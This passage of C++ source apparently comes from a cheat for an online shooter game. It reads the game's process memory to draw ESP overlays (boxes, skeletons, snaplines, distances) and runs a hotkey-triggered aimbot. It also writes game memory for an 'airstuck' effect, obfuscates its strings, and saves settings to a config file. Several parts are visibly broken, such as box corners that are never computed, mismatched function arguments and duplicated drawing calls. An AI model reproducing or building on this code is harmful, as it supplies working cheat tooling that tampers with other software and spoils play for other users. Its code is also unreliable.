	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vLeftThighOut.x, vLeftThighOut.y), ImVec2(vHipOut.x, vHipOut.y), ImGui::GetColorU32({ Settings::Skeletonchik[0], Settings::Skeletonchik[1], Settings::Skeletonchik[2], 1.0f }));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vRightThighOut.x, vRightThighOut.y), ImVec2(vHipOut.x, vHipOut.y), ImGui::GetColorU32({ Settings::Skeletonchik[0], Settings::Skeletonchik[1], Settings::Skeletonchik[2], 1.0f }));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vLeftCalfOut.x, vLeftCalfOut.y), ImVec2(vLeftThighOut.x, vLeftThighOut.y), ImGui::GetColorU32({ Settings::Skeletonchik[0], Settings::Skeletonchik[1], Settings::Skeletonchik[2], 1.0f }));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vRightCalfOut.x, vRightCalfOut.y), ImVec2(vRightThighOut.x, vRightThighOut.y), ImGui::GetColorU32({ Settings::Skeletonchik[0], Settings::Skeletonchik[1], Settings::Skeletonchik[2], 1.0f }));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vLeftFootOut.x, vLeftFootOut.y), ImVec2(vLeftCalfOut.x, vLeftCalfOut.y), ImGui::GetColorU32({ Settings::Skeletonchik[0], Settings::Skeletonchik[1], Settings::Skeletonchik[2], 1.0f }));
	ImGui::GetOverlayDrawList()->AddLine(ImVec2(vRightFootOut.x, vRightFootOut.y), ImVec2(vRightCalfOut.x, vRightCalfOut.y), ImGui::GetColorU32({ Settings::Skeletonchik[0], Settings::Skeletonchik[1], Settings::Skeletonchik[2], 1.0f }));
}

bool IsVisible = true;

void DrawESP() {

	ImDrawList* Renderer = ImGui::GetOverlayDrawList();

	Vector3 Head2;


	if (Settings::Draw_FOV_Circle) {
		ImGui::GetOverlayDrawList()->AddCircle(ImVec2(ScreenCenterX, ScreenCenterY), float(Settings::AimFOV), ImGui::GetColorU32({ Settings::DrawFOVCircle[0], Settings::DrawFOVCircle[1], Settings::DrawFOVCircle[2], 1.0f }), Settings::Shape);
		ImGui::GetOverlayDrawList()->AddCircle(ImVec2(ScreenCenterX, ScreenCenterY), float(Settings::AimFOV), ImGui::GetColorU32({ Settings::DrawFOVCircle[0], Settings::DrawFOVCircle[1], Settings::DrawFOVCircle[2], 1.0f }), Settings::Shape);
		ImGui::GetOverlayDrawList()->AddCircle(ImVec2(ScreenCenterX, ScreenCenterY), float(Settings::AimFOV), ImGui::GetColorU32({ Settings::DrawFOVCircle[0], Settings::DrawFOVCircle[1], Settings::DrawFOVCircle[2], 1.0f }), Settings::Shape);
	}
	if (Settings::Cross_Hair) {
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 - 11, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImGui::GetColorU32({ 255, 0, 0, 255.f }), 1.0f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 + 12, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImGui::GetColorU32({ 255, 0, 0, 255.f }), 1.0f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 - 11), ImVec2(Width / 2, Height / 2), ImGui::GetColorU32({ 255, 0, 0, 255.f }), 1.0f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 + 12), ImVec2(Width / 2, Height / 2), ImGui::GetColorU32({ 255, 0, 0, 255.f }), 1.0f);
	}
	if (Settings::EnableHack)
	{
		if (AimAt2)
		{
			char dist[64];
			sprintf_s(dist, "Aimbot Enabled\n", ImGui::GetIO().Framerate);
			ImGui::GetOverlayDrawList()->AddText(ImVec2(920, 30), ImGui::GetColorU32({ color.DarkRed[0], color.DarkRed[1], color.DarkRed[2], 4.0f }), dist);
		}
	}

	

	if (Settings::PlayerESP)
	{
		char dist[64];
		sprintf_s(dist, "FPS %.f\n", ImGui::GetIO().Framerate);
		ImGui::GetOverlayDrawList()->AddText(ImVec2(945, 50), ImGui::GetColorU32({ color.DarkRed[0], color.DarkRed[1], color.DarkRed[2], 4.0f }), dist);
	}


	if (Settings::Cross_Hair) {
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 - 11, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImGui::GetColorU32({ 255, 0, 0, 255.f }), 1.0f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2 + 12, Height / 2), ImVec2(Width / 2 + 1, Height / 2), ImGui::GetColorU32({ 255, 0, 0, 255.f }), 1.0f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 - 11), ImVec2(Width / 2, Height / 2), ImGui::GetColorU32({ 255, 0, 0, 255.f }), 1.0f);
		ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 2 + 12), ImVec2(Width / 2, Height / 2), ImGui::GetColorU32({ 255, 0, 0, 255.f }), 1.0f);
	}



	auto entityListCopy = entityList;
	float closestDistance = FLT_MAX;
	DWORD_PTR closestPawn = NULL;

	DWORD_PTR AActors = rpm<DWORD_PTR>(Ulevel + Offsets::AAcotrs);

	int ActorTeamId = rpm<int>(Offsets::TeamIndex); 

	int curactorid = rpm<int>(0x18);

	if (curactorid == localplayerID || curactorid == 20328438 || curactorid == 18388801 || curactorid == 20328753 || curactorid == 9343426 || curactorid == 9875120 || curactorid == 9877254 || curactorid == 22405639 || curactorid == 9874439 || curactorid == 14169230 || curactorid == 765)

		if (AActors == (DWORD_PTR)nullptr)
			return;

	for (unsigned long i = 0; i < entityListCopy.size(); ++i) {
		FNlEntity entity = entityListCopy[i];

		uint64_t CurrentActor = rpm<uint64_t>(AActors + i * Offsets::CurrentActor);

		uint64_t CurActorRootComponent = rpm<uint64_t>(entity.Actor + Offsets::RootComponent);
		if (CurActorRootComponent == (uint64_t)nullptr || CurActorRootComponent == -1 || CurActorRootComponent == NULL)
			continue;

		Vector3 RelativeLocation = rpm<Vector3>(CurActorRootComponent + Offsets::RelativeLocation);
		Vector3 RelativeLocationW2s = ProjectWorldToScreen(RelativeLocation);

		DWORD64 otherPlayerState = rpm<uint64_t>(entity.Actor + Offsets::PlayerState);
		if (otherPlayerState == (uint64_t)nullptr || otherPlayerState == -1 || otherPlayerState == NULL)
			continue;

		localactorpos = rpm<Vector3>(Rootcomp + Offsets::RelativeLocation);

		Vector3 bone66 = GetBoneWithRotation(entity.mesh, 66);
		Vector3 aimbone = GetBoneWithRotation(entity.mesh, 66);
		Vector3 bone0 = GetBoneWithRotation(entity.mesh, 0);

		Vector3 top = ProjectWorldToScreen(bone66);
		Vector3 chest = ProjectWorldToScreen(bone66);
		Vector3 aimbotspot = ProjectWorldToScreen(aimbone);
		Vector3 bottom = ProjectWorldToScreen(bone0);
		

		Vector3 Head = ProjectWorldToScreen(Vector3(bone66.x, bone66.y, bone66.z + 15));

		float distance = localactorpos.Distance(bone66) / 100.f;
		float BoxHeight = (float)(Head.y - bottom.y);
		float BoxWidth = BoxHeight * 1.46;
		float CornerHeight = abs(Head.y - bottom.y);
		float CornerWidth = BoxHeight * 0.46;
		//float CornerWidth = BoxHeight * 0.46;

		int MyTeamId = rpm<int>(PlayerState + Offsets::TeamIndex);
		int ActorTeamId = rpm<int>(otherPlayerState + Offsets::TeamIndex);
		int curactorid = rpm<int>(CurrentActor + 0x18);

		if (Settings::SelfEsp)
		{
			if (Settings::Esp_Corner_Box) {
				DrawCornerBoxFill(Head.x - (CornerWidth / 2), Head.y, CornerWidth, CornerHeight, ImGui::GetColorU32({ Settings::BoxCornerESP[0], Settings::BoxCornerESP[1], Settings::BoxCornerESP[2], 1.0f }), Settings::Thickness && Settings::opacity);
				DrawCornerBox(Head.x - (CornerWidth / 2), Head.y, CornerWidth, CornerHeight, ImGui::GetColorU32({ Settings::BoxCornerESP[0], Settings::BoxCornerESP[1], Settings::BoxCornerESP[2], 1.0f }), Settings::Thickness);
			}
			if (Settings::Esp_skeleton) {
				DrawSkeleton(entity.mesh);
			}
			if (Settings::Esp_box)
			{
				ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2), Head.y), ImVec2(bottom.x + (BoxWidth / 2), bottom.y), ImGui::GetColorU32({ Settings::Espbox[0], Settings::Espbox[1], Settings::Espbox[2], 1.0f }));
				ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2), Head.y), ImVec2(bottom.x + (BoxWidth / 2), bottom.y), ImGui::GetColorU32({ Settings::Espbox[0], Settings::Espbox[1], Settings::Espbox[2], 3.5f }));
			}
		}

		if (Settings::Airstuck) {
			write<float>(LocalPawn + 0x3758, 1);
		}

		if (MyTeamId != ActorTeamId) {
			if (distance < Settings::VisDist) {
				if (Settings::Esp_line) {
					ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 1), ImVec2(bottom.x, bottom.y), ImGui::GetColorU32({ Settings::LineESP[0], Settings::LineESP[1], Settings::LineESP[2], 1.0f }), Settings::Thickness);
				}

				

				if (Settings::ThreeDBox) {
					Vector3 BottomNoW2S;
					Vector3 HeadNoW2S;

					GetBoneWithRotation(entity.mesh, 66);
					GetBoneWithRotation(entity.mesh, 0);


					Vector3 bottom1;
					Vector3 bottom2;
					Vector3 bottom3;
					Vector3 bottom4;

					GetBoneWithRotation(BottomNoW2S.x + 30, BottomNoW2S.y - 30);
					GetBoneWithRotation(BottomNoW2S.x - 30, BottomNoW2S.y - 30);
					GetBoneWithRotation(BottomNoW2S.x - 30, BottomNoW2S.y + 30);
					GetBoneWithRotation(BottomNoW2S.x + 30, BottomNoW2S.y + 30);



					Vector3 top1;
					Vector3 top2;
					Vector3 top3;
					Vector3 top4;

					GetBoneWithRotation(HeadNoW2S.x + 30, HeadNoW2S.y - 30);
					GetBoneWithRotation(HeadNoW2S.x - 30, HeadNoW2S.y - 30);
					GetBoneWithRotation(HeadNoW2S.x - 30, HeadNoW2S.y + 30);
					GetBoneWithRotation(HeadNoW2S.x + 30, HeadNoW2S.y + 30);


					ImColor col;
					if (IsVisible) {
						col = color.YellowOrange[0];
					}
					else {
						col = color.YellowOrange[0];
					}

					Renderer->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(top1.x, top1.y), col, 1.f);
					Renderer->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(top2.x, top2.y), col, 1.f);
					Renderer->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(top3.x, top3.y), col, 1.f);
					Renderer->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(top4.x, top4.y), col, 1.f);


					Renderer->AddLine(ImVec2(bottom1.x, bottom1.y), ImVec2(bottom2.x, bottom2.y), col, 1.f);
					Renderer->AddLine(ImVec2(bottom2.x, bottom2.y), ImVec2(bottom3.x, bottom3.y), col, 1.f);
					Renderer->AddLine(ImVec2(bottom3.x, bottom3.y), ImVec2(bottom4.x, bottom4.y), col, 1.f);
					Renderer->AddLine(ImVec2(bottom4.x, bottom4.y), ImVec2(bottom1.x, bottom1.y), col, 1.f);


					Renderer->AddLine(ImVec2(top1.x, top1.y), ImVec2(top2.x, top2.y), col, 1.f);
					Renderer->AddLine(ImVec2(top2.x, top2.y), ImVec2(top3.x, top3.y), col, 1.f);
					Renderer->AddLine(ImVec2(top3.x, top3.y), ImVec2(top4.x, top4.y), col, 1.f);
					Renderer->AddLine(ImVec2(top4.x, top4.y), ImVec2(top1.x, top1.y), col, 1.f);
				}
				if (Settings::Esp_box_fill) {
					FilledRect(Head.x - (CornerWidth / 2), Head.y, CornerWidth, CornerHeight, ImColor(0, 0, 0, 125));
				}
				if (Settings::Esp_box)
				{
					if (Settings::outlineesp)
					{
						ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2 + 1), Head.y), ImVec2(bottom.x + (BoxWidth / 2), bottom.y), ImGui::GetColorU32({ color.Black[0], color.Black[1], color.Black[2], Settings::Thick }));
						ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2 - 1), Head.y), ImVec2(bottom.x + (BoxWidth / 2), bottom.y), ImGui::GetColorU32({ color.Black[0], color.Black[1], color.Black[2], Settings::Thick }));
						ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2), Head.y), ImVec2(bottom.x + (BoxWidth / 2 + 1), bottom.y), ImGui::GetColorU32({ color.Black[0], color.Black[1], color.Black[2], Settings::Thick }));
						ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2), Head.y), ImVec2(bottom.x + (BoxWidth / 2 - 1), bottom.y), ImGui::GetColorU32({ color.Black[0], color.Black[1], color.Black[2], Settings::Thick }));
					}
					ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2), Head.y), ImVec2(bottom.x + (BoxWidth / 2), bottom.y), ImGui::GetColorU32({ Settings::Espbox[0], Settings::Espbox[1], Settings::Espbox[2], 1.0f }));
				}

				if (Settings::Esp_Corner_Box) {
					if (Settings::outlineesp)
					{
						ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2 + 1), Head.y), ImVec2(bottom.x + (BoxWidth / 2), bottom.y), ImGui::GetColorU32({ color.Black[0], color.Black[1], color.Black[2], Settings::Thick }));
						ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2 - 1), Head.y), ImVec2(bottom.x + (BoxWidth / 2), bottom.y), ImGui::GetColorU32({ color.Black[0], color.Black[1], color.Black[2], Settings::Thick }));
						ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2), Head.y), ImVec2(bottom.x + (BoxWidth / 2 + 1), bottom.y), ImGui::GetColorU32({ color.Black[0], color.Black[1], color.Black[2], Settings::Thick }));
						ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2), Head.y), ImVec2(bottom.x + (BoxWidth / 2 - 1), bottom.y), ImGui::GetColorU32({ color.Black[0], color.Black[1], color.Black[2], Settings::Thick }));
					}
					DrawCornerBox(Head.x - (CornerWidth / 2), Head.y, CornerWidth, CornerHeight, ImGui::GetColorU32({ Settings::BoxCornerESP[0], Settings::BoxCornerESP[1], Settings::BoxCornerESP[2], 1.0f }), Settings::Thickness);
				}

         
				

				

				if (Settings::PlayerESP) {
					char dist[64];
					sprintf_s(dist, "Player \n %.f", distance);
					ShadowRGBText(Head.x - 5, Head.y - 35, ImColor(0, 255, 255, 255), dist);	
				}
				

				

				
				if (Settings::Esp_skeleton) {
					DrawSkeleton(entity.mesh);
				}
				if (Settings::Aimbot) {
					auto dx = aimbotspot.x - (Width / 2);
					auto dy = aimbotspot.y - (Height / 2);
					auto dz = aimbotspot.z - (Depth / 2);
					auto dist = sqrtf(dx * dx + dy * dy + dz * dz) / 100.0f;
					if (dist < Settings::AimFOV && dist < closestDistance) {
						closestDistance = dist;
						closestPawn = entity.Actor;
						
					}
				}
			}
		}
		if (MyTeamId != ActorTeamId) {
			if (distance < Settings::VisDist) {
				
				if (Settings::Team_Aimbot) {
					auto dx = aimbotspot.x - (Width / 2);
					auto dy = aimbotspot.y - (Height / 2);
					auto dz = aimbotspot.z - (Depth / 2);
					auto dist = sqrtf(dx * dx + dy * dy + dz * dz) / 100.0f;
					if (dist < Settings::AimFOV && dist < closestDistance) {
						closestDistance = dist;
						closestPawn = entity.Actor;
					}

				}
			}
		}
		else if (curactorid == 18391356)
		{
			ImGui::GetOverlayDrawList()->AddLine(ImVec2(Width / 2, Height / 1), ImVec2(bottom.x, bottom.y), ImGui::GetColorU32({ Settings::TeamLineESP[0], Settings::TeamLineESP[1], Settings::TeamLineESP[2], 1.0f }), Settings::Thickness);
		}
		if (Settings::Esp_box)
		{
			ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2), Head.y), ImVec2(bottom.x + (BoxWidth / 2), bottom.y), ImGui::GetColorU32({ Settings::Espbox[0], Settings::Espbox[1], Settings::Espbox[2], 1.0f }), 0, Settings::Thickness);
			ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2), Head.y), ImVec2(bottom.x + (BoxWidth / 2), bottom.y), ImGui::GetColorU32({ Settings::Espbox[0], Settings::Espbox[1], Settings::Espbox[2], 1.0f }), 0, Settings::Thickness);
			ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2), Head.y), ImVec2(bottom.x + (BoxWidth / 2), bottom.y), ImGui::GetColorU32({ Settings::Espbox[0], Settings::Espbox[1], Settings::Espbox[2], 1.0f }), 0, Settings::Thickness);
			ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2), Head.y), ImVec2(bottom.x + (BoxWidth / 2), bottom.y), ImGui::GetColorU32({ Settings::Espbox[0], Settings::Espbox[1], Settings::Espbox[2], 1.0f }), 0, Settings::Thickness);
			ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2), Head.y), ImVec2(bottom.x + (BoxWidth / 2), bottom.y), ImGui::GetColorU32({ Settings::Espbox[0], Settings::Espbox[1], Settings::Espbox[2], 1.0f }), 0, Settings::Thickness);
			ImGui::GetOverlayDrawList()->AddRect(ImVec2(Head.x - (BoxWidth / 2), Head.y), ImVec2(bottom.x + (BoxWidth / 2), bottom.y), ImGui::GetColorU32({ Settings::Espbox[0], Settings::Espbox[1], Settings::Espbox[2], 1.0f }), 0, Settings::Thickness);
		}
	}

	if (Settings::Aimbot) 
	{
		if (closestPawn != 0) 
		{
			if (Settings::Aimbot && closestPawn && GetAsyncKeyState(hotkeys::aimkey) < 0) 
			{
				AimAt(closestPawn);
				}
			}
			else 
		{
				isaimbotting = false;
				AimAt2(closestPawn);
			}
		}
	}



bool is_file_exist(const char* fileName)
{
	std::ifstream infile(fileName);
	return infile.good();
}

void GetKey() {

	DrawESP();
}

int r, g, b;
int r1, g2, b2;

float color_red = 1.;
float color_green = 0;
float color_blue = 0;
float color_random = 0.0;
float color_speed = -10.0;
bool rainbowmode = false;

void WriteStringToIni(std::string string, std::string file, std::string app, std::string key)
{
	WritePrivateProfileStringA(app.c_str(), key.c_str(), string.c_str(), file.c_str());
}
std::string ReadStringFromIni(std::string file, std::string app, std::string key)
{
	char buf[100];
	GetPrivateProfileStringA(app.c_str(), key.c_str(), XorStr("NULL").c_str(), buf, 100, file.c_str());
	return (std::string)buf;
}

float new_aimfov = 1;
float new_aimsmooth = 1;
float new_aimdistance = 1;
std::string swapCaller = ".exe";
std::string ReadStringFromIni_Float(std::string file, std::string app, std::string key, int float_code)
{
	char buf[100];
	GetPrivateProfileStringA(app.c_str(), key.c_str(), XorStr("NULL").c_str(), buf, 100, file.c_str());

	if (float_code == 0)
	{
		system(XorStr("cls").c_str());
		std::cout << XorStr(" [").c_str() << XorStr("ERR - 14").c_str() << XorStr("] - Contact Support.").c_str();
		Sleep(5000);
		exit(0);
	}
	else if (float_code == 1) {
		
	}
	else if (float_code == 2) {
		
	}
	else if (float_code == 3) {

	}
	else if (float_code == 4) {
		new_aimfov = std::stof(buf);
	}
	else if (float_code == 5) {
		new_aimsmooth = std::stof(buf);
	}
	else if (float_code == 6) {
		new_aimdistance = std::stof(buf);
	}
	return (std::string)buf;
}
std::string SwapHook = "Hook";
void SaveConfig()
{
	if (Settings::Aimbot)
		WriteStringToIni(XorStr("1").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("aimbot").c_str());
	else
		WriteStringToIni(XorStr("0").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("aimbot").c_str());
	if (Settings::Draw_FOV_Circle)
		WriteStringToIni(XorStr("1").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("drawfov").c_str());
	else
		WriteStringToIni(XorStr("0").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("drawfov").c_str());
	if (Settings::Esp_line)
		WriteStringToIni(XorStr("1").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("snaplines").c_str());
	else
		WriteStringToIni(XorStr("0").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("snaplines").c_str());
	if (Settings::Distance_Esp)
		WriteStringToIni(XorStr("1").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("distance").c_str());
	else
		WriteStringToIni(XorStr("0").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("distance").c_str());
	if (Settings::Esp_Corner_Box)
		WriteStringToIni(XorStr("1").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("boxes").c_str());
	else
		WriteStringToIni(XorStr("0").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("boxes").c_str());
	if (Settings::Cross_Hair)
		WriteStringToIni(XorStr("1").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("crosshair").c_str());
	else
		WriteStringToIni(XorStr("0").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("box").c_str());
	if (Settings::Esp_box)
		WriteStringToIni(XorStr("1").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("box").c_str());
	else
		WriteStringToIni(XorStr("0").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("box").c_str());
	if (Settings::SelfEsp)
		WriteStringToIni(XorStr("1").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("SelfEsp").c_str());
	else
		WriteStringToIni(XorStr("0").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("SelfEsp").c_str());
	if (Settings::Esp_skeleton)
		WriteStringToIni(XorStr("1").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("skeleton").c_str());
	else
		WriteStringToIni(XorStr("0").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("skeleton").c_str());
	if (Settings::Esp_line)
		WriteStringToIni(XorStr("1").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("line").c_str());
	else
		WriteStringToIni(XorStr("0").c_str(), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("line").c_str());
	WriteStringToIni(std::to_string(Settings::AimFOV), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("aimfov").c_str());
	WriteStringToIni(std::to_string(Settings::Aim_Speed), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("smooth").c_str());
	WriteStringToIni(std::to_string(Settings::VisDist), XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("distanceslider").c_str());
}
std::string locof = windira + inf;
void LoadConfig()
{
	if (ReadStringFromIni(XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("aimbot").c_str()) == XorStr("1").c_str())
		Settings::Aimbot = true;
	else
		Settings::Aimbot = false;
	if (ReadStringFromIni(XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("drawfov").c_str()) == XorStr("1").c_str())
		Settings::Draw_FOV_Circle = true;
	else
		Settings::Draw_FOV_Circle = false;
	if (ReadStringFromIni(XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("snaplines").c_str()) == XorStr("1").c_str())
		Settings::Esp_line = true;
	else
		Settings::Esp_line = false;
	if (ReadStringFromIni(XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("distance").c_str()) == XorStr("1").c_str())
		Settings::Distance_Esp = true;
	else
		Settings::Distance_Esp = false;
	if (ReadStringFromIni(XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("boxes").c_str()) == XorStr("1").c_str())
		Settings::Esp_Corner_Box = true;
	else
		Settings::Esp_Corner_Box = false;
	if (ReadStringFromIni(XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("crosshair").c_str()) == XorStr("1").c_str())
		Settings::Cross_Hair = true;
	else
		Settings::Cross_Hair = false;
	if (ReadStringFromIni(XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("box").c_str()) == XorStr("1").c_str())
		Settings::Esp_box = true;
	else
		Settings::Esp_box = false;
	if (ReadStringFromIni(XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("SelfEsp").c_str()) == XorStr("1").c_str())
		Settings::SelfEsp = true;
	else
		Settings::SelfEsp = false;
	if (ReadStringFromIni(XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("skeleton").c_str()) == XorStr("1").c_str())
		Settings::Esp_skeleton = true;
	else
		Settings::Esp_skeleton = false;
	if (ReadStringFromIni(XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("line").c_str()) == XorStr("1").c_str())
		Settings::Esp_line = true;
	else
		Settings::Esp_line = false;
	ReadStringFromIni_Float(XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("aimfov").c_str(), 4);
	Settings::AimFOV = new_aimfov;
	ReadStringFromIni_Float(XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("smooth").c_str(), 5);
	Settings::Aim_Speed = new_aimsmooth;
	ReadStringFromIni_Float(XorStr("C:\\config.pastepolice").c_str(), XorStr("options").c_str(), XorStr("distanceslider").c_str(), 6);
	Settings::VisDist = new_aimdistance;
}

void Active() {
	ImGuiStyle* Style = &ImGui::GetStyle();
	Style->Colors[ImGuiCol_Button] = ImColor(55, 55, 55);
	Style->Colors[ImGuiCol_ButtonActive] = ImColor(55, 55, 55);
	Style->Colors[ImGuiCol_ButtonHovered] = ImColor(0, 0, 0);
}
void Hovered() {
	ImGuiStyle* Style = &ImGui::GetStyle();
	Style->Colors[ImGuiCol_Button] = ImColor(0, 0, 0);
	Style->Colors[ImGuiCol_ButtonActive] = ImColor(0, 0, 0);
	Style->Colors[ImGuiCol_ButtonHovered] = ImColor(55, 55, 55);
}

void Active1() {
	ImGuiStyle* Style = &ImGui::GetStyle();
	Style->Colors[ImGuiCol_Button] = ImColor(0, 55, 0);
	Style->Colors[ImGuiCol_ButtonActive] = ImColor(0, 55, 0);
	Style->Colors[ImGuiCol_ButtonHovered] = ImColor(55, 0, 0);
}
void Hovered1() {
	ImGuiStyle* Style = &ImGui::GetStyle();
	Style->Colors[ImGuiCol_Button] = ImColor(55, 0, 0);
	Style->Colors[ImGuiCol_ButtonActive] = ImColor(55, 0, 0);
	Style->Colors[ImGuiCol_ButtonHovered] = ImColor(0, 55, 0);
}

int current = 1;
void render() {
	ImGui_ImplDX9_NewFrame();
	ImGui_ImplWin32_NewFrame();
	ImGui::NewFrame();
	if (Settings::Show_Menu) {

		ImGuiStyle* style = &ImGui::GetStyle();

		style->WindowPadding = ImVec2(15, 15);
		style->WindowRounding = 5.0f;
		style->FramePadding = ImVec2(4.5f, 2.5f);
		style->FrameRounding = 2.5f;
		style->ItemSpacing = ImVec2(12, 8);

		style->WindowTitleAlign = ImVec2(0.5f, 0.5f);
		style->IndentSpacing = 25.0f;


		//Tabs
		style->ItemInnerSpacing = ImVec2(18, 6);
		//style->TabRounding = 0.0f;

		style->ScrollbarSize = 0.0f;
		style->ScrollbarRounding = 0.0f;

		//Sliders
		style->GrabMinSize = 6.0f;
		style->GrabRounding = 0.0f;


		style->Colors[ImGuiCol_Text] = ImVec4(0, 0, 0, 255);
		style->Colors[ImGuiCol_TextDisabled] = ImVec4(0.24f, 0.23f, 0.29f, 1.00f);
		style->Colors[ImGuiCol_WindowBg] = ImColor(207, 207, 207, 255);
		style->Colors[ImGuiCol_PopupBg] = ImVec4(0.07f, 0.07f, 0.09f, 1.00f);
		style->Colors[ImGuiCol_Border] = ImVec4(0, 0, 0, 0);
		style->Colors[ImGuiCol_BorderShadow] = ImVec4(0, 0, 0, 0);
		style->Colors[ImGuiCol_FrameBg] = ImColor(138, 138, 138, 255);
		style->Colors[ImGuiCol_FrameBgHovered] = ImColor(42, 43, 56, 255);
		style->Colors[ImGuiCol_FrameBgActive] = ImColor(37, 38, 51, 255);


		//style->Colors[ImGuiCol_Tab] = ImColor(29, 28, 37, 255);
		//style->Colors[ImGuiCol_TabActive] = ImColor(79, 79, 81, 255);
		//style->Colors[ImGuiCol_TabHovered] = ImColor(62, 62, 66, 255);

		style->Colors[ImGuiCol_TitleBg] = ImColor(112, 112, 112, 255);
		style->Colors[ImGuiCol_TitleBgCollapsed] = ImColor(112, 112, 112, 255);
		style->Colors[ImGuiCol_TitleBgActive] = ImColor(112, 112, 112, 255);

		style->Colors[ImGuiCol_MenuBarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		style->Colors[ImGuiCol_ScrollbarBg] = ImVec4(0.10f, 0.09f, 0.12f, 1.00f);
		style->Colors[ImGuiCol_ScrollbarGrab] = ImVec4(0.80f, 0.80f, 0.83f, 0.31f);
		style->Colors[ImGuiCol_ScrollbarGrabHovered] = ImVec4(0.56f, 0.56f, 0.58f, 1.00f);
		style->Colors[ImGuiCol_ScrollbarGrabActive] = ImVec4(0.06f, 0.05f, 0.07f, 1.00f);
		style->Colors[ImGuiCol_CheckMark] = ImColor(0, 0, 0, 255);
		style->Colors[ImGuiCol_SliderGrab] = ImVec4(3.0f, 3.0f, 3.0f, 255.0f);
		style->Colors[ImGuiCol_SliderGrabActive] = ImVec4(3.0f, 3.0f, 3.0f, 255.0f);
